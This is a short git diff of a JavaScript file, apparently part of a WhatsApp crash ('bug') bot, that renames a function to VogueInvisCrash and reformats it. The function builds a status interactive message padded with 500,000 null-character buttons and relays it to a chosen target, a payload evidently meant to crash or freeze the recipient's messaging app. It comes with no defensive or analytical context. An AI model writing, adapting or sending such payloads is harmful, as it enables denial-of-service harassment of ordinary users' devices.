@@ -5978,30 +5978,29 @@ async function VogueHardInvis(sock, target) {
     });
 }
 
-async function VogueButton(sock, target) {
-  const payload = {
-    groupStatusMessageV2: {
-      message: {
-        interactiveMessage: {
-          header: {
-            title: "t.me/PrinceXVogue"
-          },
-          body: {
-            text: "\0"
-          },
-          nativeFlowMessage: {
-            buttons: "\0".repeat(500000)
-          }
+async function VogueInvisCrash(sock, target) {
+    const payload = {
+        groupStatusMessageV2: {
+            message: {
+                interactiveMessage: {
+                    header: {
+                        title: "t.me/PrinceXVogue"
+                    },
+                    body: {
+                        text: "\0"
+                    },
+                    nativeFlowMessage: {
+                        buttons: "\0".repeat(500000)
+                    }
+                }
+            }
         }
-      }
-    }
-  };
-  
-  await sock.relayMessage(target, payload, {
-    participant: { jid: target }
-  });
+    };
+    
+    await sock.relayMessage(target, payload, {
+        participant: { jid: target }
+    });
 }
-
 //     _       ___  _   _ _   _ _____  _   _        
 //    | |     / _ \| | | | \ | /  __ \| | | |       
 //    | |    / /_\ \ | | |  \| | /  \/| |_| |       
